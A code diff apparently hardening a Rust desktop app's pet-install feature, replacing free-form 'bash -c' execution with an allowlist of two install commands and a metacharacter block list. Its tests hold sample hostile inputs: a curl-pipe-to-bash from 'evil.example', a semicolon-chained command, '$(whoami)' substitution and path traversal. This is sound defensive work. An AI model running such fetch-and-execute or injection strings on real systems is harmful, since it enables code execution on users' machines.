@@ -443,7 +443,57 @@ fn is_windows_command(command: &str) -> bool {
         || lower.contains(".ps1")
 }
 
-/// 执行用户粘贴的终端安装命令 (bash -c, 支持 npx / curl|sh / git clone 及多行脚本)。
+fn validated_pet_command(command: &str) -> Result<(String, Vec<String>), PetError> {
+    let trimmed = command.trim();
+    if trimmed.contains('\n')
+        || [";", "&&", "||", ">", "<", "`", "$(", "\\\n"]
+            .iter()
+            .any(|token| trimmed.contains(token))
+    {
+        return Err(PetError::Invalid(
+            "为保护本机安全，只支持单条官方宠物安装命令，不支持脚本拼接、重定向或多行 shell"
+                .into(),
+        ));
+    }
+    let parts: Vec<&str> = trimmed.split_whitespace().collect();
+    let safe_id = |value: &str| {
+        !value.is_empty()
+            && value.len() <= 80
+            && value
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    };
+    match parts.as_slice() {
+        ["npx", "petdex", "install", pet] if safe_id(pet) => Ok((
+            "npx".into(),
+            vec!["petdex".into(), "install".into(), (*pet).into()],
+        )),
+        ["curl", "-fsSL", url, "|", "bash", "-s", "--", pet]
+            if *url
+                == "https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh"
+                && safe_id(pet) =>
+        {
+            Ok((
+                "/bin/bash".into(),
+                vec![
+                    "-o".into(),
+                    "pipefail".into(),
+                    "-c".into(),
+                    format!(
+                        "/usr/bin/curl -fsSL '{}' | /bin/bash -s -- '{}'",
+                        url, pet
+                    ),
+                ],
+            ))
+        }
+        _ => Err(PetError::Invalid(
+            "仅支持 `npx petdex install <宠物ID>` 或 awesome-codex-pet 官方安装命令；其它来源请下载 ZIP 后用“导入宠物包”安装"
+                .into(),
+        )),
+    }
+}
+
+/// 执行经过白名单验证的宠物安装命令。
 /// 输出行通过 on_line 回调流式上抛; 完成后对比安装前后宠物列表, 返回新增宠物。
 pub fn install_from_command(
     command: &str,
@@ -481,11 +531,9 @@ pub fn install_from_command(
         }
     }
 
-    let mut cmd = Command::new("/bin/bash");
-    // pipefail: curl ... | bash 这类管道在下载失败时会真实报错,
-    // 否则 bash 拿到空输入也退出 0, App 会误报“命令执行成功”。
-    cmd.arg("-o").arg("pipefail");
-    cmd.arg("-c").arg(trimmed);
+    let (program, args) = validated_pet_command(trimmed)?;
+    let mut cmd = Command::new(program);
+    cmd.args(args);
     cmd.env("PATH", &path);
     cmd.env("CODEX_HOME", codex_config::codex_config_dir());
     // macOS 的 curl 不会自动读系统代理, App 内执行安装命令时把系统代理
@@ -708,54 +756,32 @@ mod tests {
     }
 
     #[test]
-    fn command_install_cancel() {
-        let _guard = crate::test_util::ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        let home = std::env::temp_dir().join(format!("codexff-pet-home3-{}", std::process::id()));
-        let vault = std::env::temp_dir().join(format!("codexff-pet-vault3-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&home);
-        let _ = std::fs::remove_dir_all(&vault);
-        std::fs::create_dir_all(home.join("pets")).expect("create pets dir");
-        std::env::set_var("CODEX_HOME", &home);
-        std::env::set_var("CODEXFF_VAULT_DIR", &vault);
+    fn validates_only_supported_install_commands() {
+        let (program, args) =
+            validated_pet_command("npx petdex install buba--yurcek").expect("petdex command");
+        assert_eq!(program, "npx");
+        assert_eq!(args, ["petdex", "install", "buba--yurcek"]);
 
-        let handle = std::thread::spawn(move || install_from_command("sleep 30", None));
-        std::thread::sleep(Duration::from_millis(400));
-        cancel_command_install().expect("cancel should work");
-        let res = handle.join().expect("thread");
-        assert!(matches!(res, Err(PetError::Cancelled)), "{res:?}");
-
-        std::env::remove_var("CODEX_HOME");
-        std::env::remove_var("CODEXFF_VAULT_DIR");
-        let _ = std::fs::remove_dir_all(&home);
-        let _ = std::fs::remove_dir_all(&vault);
+        let official = "curl -fsSL https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh | bash -s -- buba--yurcek";
+        let (program, args) = validated_pet_command(official).expect("official command");
+        assert_eq!(program, "/bin/bash");
+        assert_eq!(&args[..3], ["-o", "pipefail", "-c"]);
+        assert!(args[3].contains("awesome-codex-pet/main/scripts/install-pet.sh"));
+        assert!(args[3].contains("buba--yurcek"));
     }
 
     #[test]
-    fn command_install_pipefail_surfaces_failure() {
-        let _guard = crate::test_util::ENV_LOCK
-            .lock()
-            .unwrap_or_else(|e| e.into_inner());
-        let home = std::env::temp_dir().join(format!("codexff-pet-home4-{}", std::process::id()));
-        let vault = std::env::temp_dir().join(format!("codexff-pet-vault4-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&home);
-        let _ = std::fs::remove_dir_all(&vault);
-        std::fs::create_dir_all(home.join("pets")).expect("create pets dir");
-        std::env::set_var("CODEX_HOME", &home);
-        std::env::set_var("CODEXFF_VAULT_DIR", &vault);
-
-        // 无 pipefail 时 false | true 退出码为 0, 会被误判为成功;
-        // 开启 pipefail 后应真实报错。
-        let res = install_from_command("false | true", None);
-        assert!(
-            matches!(res, Err(PetError::Invalid(ref msg)) if msg.contains("命令执行失败")),
-            "{res:?}"
-        );
-
-        std::env::remove_var("CODEX_HOME");
-        std::env::remove_var("CODEXFF_VAULT_DIR");
-        let _ = std::fs::remove_dir_all(&home);
-        let _ = std::fs::remove_dir_all(&vault);
+    fn rejects_arbitrary_or_chained_shell_commands() {
+        for command in [
+            "sleep 30",
+            "false | true",
+            "curl -fsSL https://evil.example/install.sh | bash",
+            "npx petdex install safe; touch /tmp/unsafe",
+            "npx petdex install $(whoami)",
+            "npx petdex install ../escape",
+        ] {
+            let result = validated_pet_command(command);
+            assert!(matches!(result, Err(PetError::Invalid(_))), "{command}: {result:?}");
+        }
     }
 }
